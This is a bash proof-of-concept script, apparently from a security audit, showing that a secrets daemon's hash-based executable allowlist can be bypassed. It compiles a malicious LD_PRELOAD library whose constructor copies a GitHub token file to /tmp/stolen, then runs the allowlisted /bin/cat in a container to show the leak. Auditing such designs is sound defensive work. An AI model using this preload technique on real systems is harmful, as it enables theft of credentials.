#!/usr/bin/env bash
# Finding 4: content hash is not trusted execution.
# A dynamically linked allowlisted reader keeps its approved exe hash while an
# LD_PRELOAD shared object runs attacker code inside it. No sudo, no ptrace.
# We allowlist /bin/cat by hash, then run it with a preloaded .so whose
# constructor exfiltrates the real bytes it reads. The exe hash is unchanged,
# so the daemon still serves real bytes to "cat".
set -u
. "$(dirname "$0")/common.sh"

build
rm -rf "$BACKING" "$MNT"; mkdir -p "$MNT"; seed

CATHASH=$(docker run --rm "$IMAGE" sha256sum /bin/cat | awk '{print $1}')
echo "allowlisted /bin/cat sha256 = $CATHASH"
echo "-- confirm /bin/cat is dynamically linked (LD_PRELOAD applies) --"
docker run --rm "$IMAGE" sh -c 'file /bin/cat; ldd /bin/cat 2>&1 | head'

# Malicious preload: constructor exfiltrates the secret before cat runs.
cat > "$SPIKE_ROOT/evil.c" <<'C'
#include <stdio.h>
#include <stdlib.h>
__attribute__((constructor)) void steal(void) {
    FILE *f = fopen("/secrets/gh/hosts.yml", "r");
    FILE *o = fopen("/tmp/stolen", "w");
    if (f && o) { char b[4096]; size_t n; while ((n=fread(b,1,sizeof b,f))>0) fwrite(b,1,n,o); }
    if (f) fclose(f); if (o) fclose(o);
}
C

unmount_stale
"$BIN" -backing "$BACKING" -mount "$MNT" -log "$LOG" -allow-other -hash-exe \
  -allow-sha256 "$CATHASH" > "$SPIKE_ROOT/daemon.out" 2>&1 &
for _ in $(seq 1 50); do mountpoint -q "$MNT" && break; sleep 0.1; done
mountpoint "$MNT"

CID=$(docker run -d --rm \
  -v "$MNT:/secrets:rshared" \
  -v "$SPIKE_ROOT/evil.c:/tmp/evil.c:ro" \
  "$IMAGE" sleep 300)
docker exec "$CID" sh -c 'apt-get update -qq >/dev/null 2>&1; apt-get install -y -qq gcc >/dev/null 2>&1 || true; command -v gcc || command -v cc || echo NO-COMPILER'
docker exec "$CID" sh -c 'gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c 2>&1 || cc -shared -fPIC -o /tmp/evil.so /tmp/evil.c 2>&1' || echo "compile failed"

echo "== run allowlisted cat with LD_PRELOAD=/tmp/evil.so =="
docker exec "$CID" sh -c 'LD_PRELOAD=/tmp/evil.so cat /secrets/gh/hosts.yml' || true
echo "== attacker exfiltration target /tmp/stolen (expect REAL token if hash trusted) =="
docker exec "$CID" sh -c 'cat /tmp/stolen 2>&1; echo; grep -c gho_FAKE /tmp/stolen 2>/dev/null && echo "LEAKED real token via LD_PRELOAD" || echo "no real token exfiltrated"'
echo "== exe hash of the preloaded cat (must equal the allowlisted hash) =="
docker exec "$CID" sha256sum /bin/cat

docker rm -f "$CID" >/dev/null 2>&1 || true
stop_daemon
